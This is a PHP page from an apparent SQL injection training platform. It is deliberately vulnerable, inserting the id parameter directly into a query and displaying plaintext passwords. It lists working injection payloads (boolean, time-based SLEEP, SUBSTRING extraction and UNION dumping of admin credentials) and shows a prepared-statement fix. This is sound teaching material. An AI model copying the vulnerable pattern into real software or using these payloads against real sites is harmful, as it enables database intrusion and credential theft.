<?php
/**
 * Vulnerable User Profile Page
 * SQL Injection Training Platform
 * 
 * WARNING: This code is INTENTIONALLY VULNERABLE for educational purposes
 * DO NOT USE IN PRODUCTION!
 */

require_once 'config.php';
require_once 'includes/db.php';
require_once 'includes/functions.php';
require_once 'includes/logger.php';

// Redirect to login if not logged in
if (!isLoggedIn()) {
    redirect(BASE_URL . '/login.php');
}

$user_data = null;
$query_executed = '';
$error = '';

// Get user ID from GET parameter (VULNERABLE!)
if (isset($_GET['id'])) {
    // NO validation or sanitization (INTENTIONALLY VULNERABLE!)
    $user_id = $_GET['id'];
    
    // Build vulnerable SQL query - no quotes around ID (allows boolean-based blind injection)
    $query = "SELECT * FROM users WHERE id = $user_id";
    
    // Store query for display
    $query_executed = $query;
    
    // Execute the vulnerable query
    $conn = getConnection();
    $result = $conn->query($query);
    
    if ($result) {
        if ($result->num_rows > 0) {
            $user_data = $result->fetch_assoc();
            
            // Log the profile view
            logActivity(getCurrentUserId(), 'PROFILE_VIEW', $query);
        } else {
            $error = 'User not found. Or maybe your injection returned false? 🤔';
            logActivity(getCurrentUserId(), 'PROFILE_NOT_FOUND', $query);
        }
    } else {
        // Query failed - display detailed error for educational purposes
        $error = $conn->error;
        displayError($error);
        logActivity(getCurrentUserId(), 'PROFILE_ERROR', $query . ' | Error: ' . $error);
    }
    
    closeConnection($conn);
} else {
    // No ID provided, redirect to current user's profile
    redirect(BASE_URL . '/profile.php?id=' . getCurrentUserId());
}

displayHeader('User Profile');
?>

<div class="card">
    <h2>👤 User Profile</h2>
    
    <?php if ($query_executed): ?>
        <?php displayQuery($query_executed); ?>
    <?php endif; ?>
    
    <?php if ($error): ?>
        <div class="error-box">
            <p><?php echo htmlspecialchars($error); ?></p>
        </div>
    <?php endif; ?>
    
    <?php if ($user_data): ?>
        <table>
            <tr>
                <th>Field</th>
                <th>Value</th>
            </tr>
            <tr>
                <td><strong>ID</strong></td>
                <td><?php echo htmlspecialchars($user_data['id']); ?></td>
            </tr>
            <tr>
                <td><strong>Username</strong></td>
                <td><?php echo htmlspecialchars($user_data['username']); ?></td>
            </tr>
            <tr>
                <td><strong>Password</strong></td>
                <td><code><?php echo htmlspecialchars($user_data['password']); ?></code> (Plaintext! 😱)</td>
            </tr>
            <tr>
                <td><strong>Email</strong></td>
                <td><?php echo htmlspecialchars($user_data['email']); ?></td>
            </tr>
            <tr>
                <td><strong>Is Admin</strong></td>
                <td><?php echo $user_data['is_admin'] ? '✅ Yes' : '❌ No'; ?></td>
            </tr>
            <tr>
                <td><strong>Created At</strong></td>
                <td><?php echo htmlspecialchars($user_data['created_at']); ?></td>
            </tr>
            <tr>
                <td><strong>Last Login</strong></td>
                <td><?php echo htmlspecialchars($user_data['last_login'] ?? 'Never'); ?></td>
            </tr>
        </table>
        
        <?php if ($user_data['is_admin']): ?>
            <div class="success-box">
                <h3>🎉 Congratulations!</h3>
                <p>You're viewing an admin account! If you got here through SQL injection, well done!</p>
                <p><a href="admin/index.php" class="btn btn-success">Go to Admin Panel</a></p>
            </div>
        <?php endif; ?>
    <?php endif; ?>
</div>

<div class="card">
    <h3>🔗 Quick Links</h3>
    <p>View other user profiles:</p>
    <a href="profile.php?id=1" class="btn btn-primary">User ID 1</a>
    <a href="profile.php?id=2" class="btn btn-primary">User ID 2</a>
    <a href="profile.php?id=3" class="btn btn-primary">User ID 3</a>
    <a href="profile.php?id=4" class="btn btn-primary">User ID 4</a>
</div>

<div class="card">
    <h3>💡 SQL Injection Techniques</h3>
    <p>This profile page is <strong>intentionally vulnerable</strong> to SQL injection via the ID parameter.</p>
    
    <h4>1. Error-Based Injection</h4>
    <p>Try injecting invalid SQL to see detailed error messages:</p>
    <code>profile.php?id=1'</code><br>
    <code>profile.php?id=1 AND 1=2</code>
    
    <h4>2. Boolean-Based Blind Injection</h4>
    <p>Test conditions that return true or false:</p>
    <code>profile.php?id=1 AND 1=1</code> (Should show user)<br>
    <code>profile.php?id=1 AND 1=2</code> (Should show "User not found")<br>
    <code>profile.php?id=1 AND (SELECT COUNT(*) FROM users) > 0</code>
    
    <h4>3. Extract Data Character by Character</h4>
    <p>Use SUBSTRING to extract data one character at a time:</p>
    <code>profile.php?id=1 AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a'</code><br>
    <code>profile.php?id=1 AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='p'</code>
    
    <h4>4. Time-Based Blind Injection</h4>
    <p>Use SLEEP() to create delays when conditions are true:</p>
    <code>profile.php?id=1 AND IF(1=1, SLEEP(5), 0)</code> (Page delays 5 seconds)<br>
    <code>profile.php?id=1 AND IF(1=2, SLEEP(5), 0)</code> (No delay)<br>
    <code>profile.php?id=1 AND IF(SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a', SLEEP(3), 0)</code>
    
    <h4>5. UNION-Based Injection</h4>
    <p>Extract data from other tables:</p>
    <code>profile.php?id=999 UNION SELECT 1,2,3,4,5,6,7</code><br>
    <code>profile.php?id=999 UNION SELECT id, username, password, email, is_admin, created_at, last_login FROM users WHERE username='admin'</code>
    
    <h4>Why is this vulnerable?</h4>
    <div class="code-display">
        <pre>// VULNERABLE CODE (DO NOT USE IN PRODUCTION!)
$user_id = $_GET['id'];  // No validation or sanitization!

// Direct parameter insertion without quotes (enables blind injection)
$query = "SELECT * FROM users WHERE id = $user_id";

// Direct query execution
$result = $conn->query($query);

// Detailed error messages reveal database structure
if (!$result) {
    echo $conn->error;  // Shows table names, column names, etc.
}</pre>
    </div>
    
    <h4>How to fix it?</h4>
    <div class="code-display">
        <pre>// SECURE CODE (Use this in production!)
$user_id = $_GET['id'];

// Validate input is numeric
if (!is_numeric($user_id)) {
    die("Invalid user ID");
}

// Use prepared statements with parameter binding
$stmt = $conn->prepare("SELECT id, username, email, is_admin, created_at, last_login FROM users WHERE id = ?");
$stmt->bind_param("i", $user_id);
$stmt->execute();
$result = $stmt->get_result();

// Don't display detailed error messages
// Don't show passwords in output
// Use password_hash() for password storage</pre>
    </div>
</div>

<div class="card">
    <h3>🎯 Challenge Hints</h3>
    <p><strong>Challenge 3: Blind Injection</strong> - Use boolean-based blind injection to extract the admin password</p>
    <p><strong>Challenge 4: Time-Based Blind</strong> - Use SLEEP() to extract data when you can't see results</p>
    <p><a href="challenges/challenge3.php" class="btn btn-success">Go to Challenge 3</a></p>
    <p><a href="challenges/challenge4.php" class="btn btn-warning">Go to Challenge 4</a></p>
</div>

<?php displayFooter(); ?>
